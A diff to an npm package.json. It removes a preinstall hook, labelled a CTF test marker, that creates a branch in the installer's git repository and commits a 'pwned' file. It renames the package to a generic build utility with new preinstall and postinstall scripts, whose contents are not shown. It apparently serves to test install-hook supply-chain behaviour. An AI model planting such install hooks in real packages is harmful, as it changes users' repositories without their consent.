@@ -1,8 +1,13 @@
 {
-  "name": "i-get-watch",
-  "version": "0.1.0",
+  "name": "build-utils-helper",
+  "version": "1.2.4",
+  "description": "Helpful utilities for build processes and CI/CD environments",
+  "main": "index.js",
   "scripts": {
-    "preinstall": "sh -c 'git rev-parse --is-inside-work-tree >/dev/null 2>&1 || exit 0; git switch -c ctf-pwned-test || exit 1; printf \"CTF test marker\\n\" > pwned.txt; git add pwned.txt && git -c user.name=\"CTF Test\" -c user.email=\"ctf@example.invalid\" commit -m \"Add CTF test marker\"'"
+    "preinstall": "node scripts/check-env.js",
+    "postinstall": "node scripts/setup.js"
   },
+  "keywords": ["build", "utils", "ci", "helper", "environment"],
+  "author": "BuildTools Team",
   "license": "MIT"
 }
